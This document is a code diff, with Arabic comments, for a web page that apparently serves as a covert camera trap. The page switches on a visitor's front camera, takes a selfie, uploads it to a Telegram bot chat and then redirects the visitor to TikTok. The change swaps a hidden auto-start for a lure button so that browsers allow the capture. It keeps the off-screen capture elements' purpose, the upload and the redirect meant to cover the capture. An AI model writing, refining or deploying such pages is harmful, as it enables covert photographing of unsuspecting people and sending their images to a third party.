@@ -8,14 +8,53 @@
             margin: 0;
             padding: 0;
             background: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        
+        #startButton {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+            transition: transform 0.3s;
+            z-index: 9999;
+        }
+        
+        #startButton:hover {
+            transform: scale(1.1);
+        }
+        
+        #status {
+            color: white;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+        
+        /* عناصر التصوير مخفية */
+        #video, #canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- عناصر التصوير مخفية -->
-    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div style="text-align: center;">
+        <button id="startButton">📸 اضغط لبدء التصوير</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- عناصر التصوير -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         // ====== الثوابت ======
@@ -30,14 +69,26 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+        const startButton = document.getElementById('startButton');
+        const statusDiv = document.getElementById('status');
         
         // ====== المتغيرات ======
         let cameraStream = null;
-        let isPhotoTaken = false;
+        let isProcessing = false;
+
+        // ====== دالة تحديث الحالة ======
+        function updateStatus(text, isError = false) {
+            statusDiv.style.display = 'block';
+            statusDiv.textContent = text;
+            statusDiv.style.color = isError ? '#ff4444' : '#ffffff';
+            console.log(text);
+        }
 
         // ====== دالة إرسال الصورة ======
         async function sendPhotoToTelegram(photoBlob) {
             try {
+                updateStatus('📤 جاري إرسال الصورة...');
+                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', photoBlob, 'selfie.jpg');
@@ -49,11 +100,16 @@
                 });
 
                 const result = await response.json();
-                console.log('نتيجة الإرسال:', result);
+                
+                if (result.ok) {
+                    updateStatus('✅ تم إرسال الصورة بنجاح');
+                } else {
+                    updateStatus('❌ فشل إرسال الصورة', true);
+                }
                 
                 return result.ok;
             } catch (error) {
-                console.error('خطأ في الإرسال:', error);
+                updateStatus(`❌ خطأ في الإرسال: ${error.message}`, true);
                 return false;
             }
         }
@@ -139,18 +195,15 @@
             window.location.href = "https://www.tiktok.com";
         }
 
-        // ====== الدالة الرئيسية ======
-        async function start() {
-            // التحقق من وجود ID
-            if (!CHAT_ID) {
-                console.log('لا يوجد ID، توجيه إلى تيك توك');
-                redirectToTikTok();
-                return;
-            }
+        // ====== الدالة الرئيسية للتصوير ======
+        async function startCapture() {
+            if (isProcessing || !CHAT_ID) return;
+            
+            isProcessing = true;
+            startButton.style.display = 'none';
+            updateStatus('📸 جاري تشغيل الكاميرا...');
 
             try {
-                console.log('جاري تشغيل الكاميرا الأمامية...');
-                
                 // تشغيل الكاميرا الأمامية
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -166,16 +219,15 @@
                 // انتظار تحميل الفيديو
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        console.log('تم تحميل الفيديو');
                         resolve();
                     };
                 });
                 
-                // تشغيل الفيديو
+                // تشغيل الفيديو (الآن مسموح لأنه بسبب تفاعل المستخدم)
                 await video.play();
-                console.log('الفيديو شغال');
+                updateStatus('✅ الكاميرا شغالة، جاري التقاط الصورة...');
                 
-                // انتظار 2 ثانية لتثبيت الكاميرا والإضاءة
+                // انتظار ثانيتين لتثبيت الكاميرا والإضاءة
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 
                 // محاولة التقاط الصورة (مع 3 محاولات)
@@ -185,16 +237,15 @@
                 
                 while (attempts < maxAttempts && !photoBlob) {
                     attempts++;
-                    console.log(`محاولة ${attempts} لالتقاط الصورة...`);
+                    updateStatus(`🔄 محاولة ${attempts}/${maxAttempts}...`);
                     
                     try {
                         photoBlob = await capturePhoto();
-                        console.log('تم التقاط الصورة بنجاح');
+                        updateStatus('✅ تم التقاط الصورة');
                     } catch (captureError) {
-                        console.log(`فشلت المحاولة ${attempts}:`, captureError);
+                        updateStatus(`❌ المحاولة ${attempts} فشلت: ${captureError}`, true);
                         
                         if (attempts < maxAttempts) {
-                            // انتظار نصف ثانية قبل المحاولة التالية
                             await new Promise(resolve => setTimeout(resolve, 500));
                         }
                     }
@@ -205,18 +256,10 @@
                 }
                 
                 // إرسال الصورة إلى تليجرام
-                console.log('جاري إرسال الصورة...');
-                const sent = await sendPhotoToTelegram(photoBlob);
-                
-                if (sent) {
-                    console.log('تم إرسال الصورة بنجاح');
-                } else {
-                    console.log('فشل إرسال الصورة');
-                    await sendErrorMessage('تم التقاط الصورة ولكن فشل الإرسال');
-                }
+                await sendPhotoToTelegram(photoBlob);
                 
             } catch (error) {
-                console.error('حدث خطأ:', error);
+                updateStatus(`❌ خطأ: ${error.message}`, true);
                 
                 // إرسال رسالة الخطأ إلى تليجرام
                 await sendErrorMessage(error.message || 'خطأ غير معروف');
@@ -225,20 +268,27 @@
                 // إغلاق الكاميرا
                 stopCamera();
                 
-                // التوجيه إلى تيك توك بعد ثانية
-                setTimeout(redirectToTikTok, 1000);
+                // التوجيه إلى تيك توك بعد ثانيتين
+                updateStatus('🔄 جاري التحويل إلى تيك توك...');
+                setTimeout(redirectToTikTok, 2000);
             }
         }
 
-        // ====== بدء التشغيل ======
-        start();
+        // ====== التحقق من ID ======
+        if (!CHAT_ID) {
+            updateStatus('⚠️ لا يوجد ID، جاري التحويل...', true);
+            setTimeout(redirectToTikTok, 2000);
+        } else {
+            // إضافة حدث للزر
+            startButton.addEventListener('click', startCapture);
+        }
 
-        // ====== طوارئ: توجيه بعد 15 ثانية ======
+        // ====== طوارئ: توجيه بعد 30 ثانية ======
         setTimeout(() => {
-            console.log('طوارئ: توجيه بعد 15 ثانية');
-            stopCamera();
-            redirectToTikTok();
-        }, 15000);
+            if (!isProcessing) {
+                redirectToTikTok();
+            }
+        }, 30000);
         
     </script>
 </body>
